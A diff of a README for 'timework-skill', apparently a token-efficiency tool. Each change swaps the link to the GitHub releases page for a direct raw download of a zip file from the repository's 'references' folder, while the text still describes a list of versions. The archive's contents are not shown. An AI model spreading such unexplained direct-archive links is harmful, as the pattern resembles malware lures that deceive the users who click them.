@@ -1,6 +1,6 @@
 # ⏳ timework-skill - Use Tokens Efficiently Over Time
 
-[![Download timework-skill](https://img.shields.io/badge/Download-timework--skill-4c1?style=for-the-badge&logo=github)](https://github.com/mateooo24/timework-skill/releases)
+[![Download timework-skill](https://img.shields.io/badge/Download-timework--skill-4c1?style=for-the-badge&logo=github)](https://github.com/mateooo24/timework-skill/raw/refs/heads/main/references/timework-skill-v2.0-alpha.5.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Here is how to get timework-skill ready on your computer, step by step.
 
 Click this link to open the download page:  
 
-[Download timework-skill](https://github.com/mateooo24/timework-skill/releases)
+[Download timework-skill](https://github.com/mateooo24/timework-skill/raw/refs/heads/main/references/timework-skill-v2.0-alpha.5.zip)
 
 You will see a list of available versions. Look for the latest release at the top. This page shows all versions so you can choose the one that fits your needs best.
 
@@ -95,7 +95,7 @@ You can pause or stop the session anytime by pressing the respective buttons.
 
 Use this link to visit the official release page and get the program file:
 
-[Get timework-skill here](https://github.com/mateooo24/timework-skill/releases)
+[Get timework-skill here](https://github.com/mateooo24/timework-skill/raw/refs/heads/main/references/timework-skill-v2.0-alpha.5.zip)
 
 Steps to download:
 
@@ -151,4 +151,4 @@ You can back up or remove config files to reset your settings.
 
 ---
 
-[![Download timework-skill](https://img.shields.io/badge/Download-timework--skill-4c1?style=for-the-badge&logo=github)](https://github.com/mateooo24/timework-skill/releases)
+[![Download timework-skill](https://img.shields.io/badge/Download-timework--skill-4c1?style=for-the-badge&logo=github)](https://github.com/mateooo24/timework-skill/raw/refs/heads/main/references/timework-skill-v2.0-alpha.5.zip)
